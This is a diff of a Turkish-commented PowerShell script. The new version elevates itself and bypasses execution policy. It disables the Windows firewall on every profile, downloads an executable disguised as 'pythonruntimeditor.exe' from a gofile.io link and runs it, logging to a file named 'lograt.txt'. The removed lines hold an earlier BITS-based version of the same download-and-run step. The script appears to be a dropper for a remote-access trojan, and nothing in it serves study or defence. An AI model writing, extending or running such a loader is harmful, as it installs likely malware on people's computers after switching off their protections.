@@ -1,18 +1,47 @@
-$exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
-$localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"
-
-# BITS ile dosya indir
-Start-BitsTransfer -Source $exeUrl -Destination $localPath
-
-# Dosya kontrolü
-$fileSize = (Get-Item $localPath).length
-$expectedSize = 46000  # 46 KB
-
-if ($fileSize -lt $expectedSize) {
-    Write-Host "Dosya boyutu hatalı, tekrar indiriyorum..."
-    Remove-Item $localPath -Force
-    Start-BitsTransfer -Source $exeUrl -Destination $localPath
+# Yöneticilik kontrolü, yoksa yeni bir PowerShell oturumu başlatılır
+if (-not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\PowerShellAdmin")) {
+    Start-Process powershell -ArgumentList "Start-Process PowerShell -ArgumentList '-NoExit', '-ExecutionPolicy Bypass', '-Command $MyInvocation.MyCommand.Path'" -Verb RunAs
+    exit
 }
 
-# Dosyayı çalıştır
-Start-Process -FilePath $localPath -WindowStyle Normal
+# Firewall kapatma
+function Disable-Firewall {
+    Write-Host "Firewall kapatılıyor..."
+    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+    Write-Host "Firewall kapalı!"
+}
+
+# Dosya indir
+$exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
+$localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"
+$logFile = "C:\Users\dogud\Downloads\lograt.txt"
+
+# Log fonksiyonu
+$log = { param($msg) Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg") }
+
+# Dosya indir ve kontrol et
+try {
+    $log "İndirme işlemi başlatılıyor..."
+    Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -ErrorAction Stop
+
+    # Dosya boyutunu kontrol et
+    $fileSize = (Get-Item $localPath).length
+    $expectedSize = 46000  # 46 KB'lik dosya için
+
+    if ($fileSize -lt $expectedSize) {
+        $log "HATA: Dosya boyutu hatalı. Boyut: $fileSize byte. Yeniden indiriyorum..."
+        Remove-Item $localPath -Force
+        Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -ErrorAction Stop
+    } else {
+        $log "Dosya başarıyla indirildi. Boyut: $fileSize byte"
+    }
+
+    # Firewall kapatılıyor
+    Disable-Firewall
+
+    # Dosyayı çalıştır
+    $log "Dosya çalıştırılıyor..."
+    Start-Process -FilePath $localPath -WindowStyle Normal
+} catch {
+    $log "HATA: $($_.Exception.Message)"
+}
